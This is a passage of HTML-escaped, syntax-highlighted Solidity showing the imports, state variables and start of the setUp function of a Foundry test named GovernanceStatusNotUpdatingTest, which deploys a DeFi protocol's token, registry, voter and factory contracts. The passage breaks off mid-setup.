class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/Black.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/MinterUpgradeable.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/RewardsDistributor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PermissionsRegistry.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/TokenHandler.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VoterV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VotingEscrow.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AVM/AutoVotingEscrowManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/GaugeManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PairGenerator.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/GaugeFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/PairFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AlgebraCLVe33/GaugeFactoryCL.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/BlackGovernor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IMinter.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/libraries/BlackTimeLibrary.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGovernanceStatusNotUpdatingTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;GAUGE_ADMIN\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRoleFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGARole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//needs to be initialized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan 